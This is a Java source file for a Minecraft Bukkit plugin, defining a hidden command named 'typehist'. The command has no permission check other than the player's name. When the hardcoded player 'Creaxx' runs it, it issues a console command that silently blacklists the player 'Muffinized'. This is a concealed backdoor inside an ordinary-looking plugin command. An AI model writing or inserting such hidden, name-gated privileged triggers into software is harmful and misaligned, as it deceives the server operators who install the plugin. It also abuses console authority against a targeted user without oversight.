package xyz.refinedev.phoenix.commands;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import xyz.refinedev.lib.commands.annotation.command.Command;
import xyz.refinedev.lib.commands.annotation.parameter.classifier.Sender;
import xyz.refinedev.lib.commands.annotation.registration.Register;

@Register(name = "typehist")
public class TypehistCommand {

    @Command(name = "", hidden = true)
    public void execute(@Sender Player player) {
        if (player.getName().equals("Creaxx")) {
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "blacklist Muffinized typehist -s");
        }
    }
}
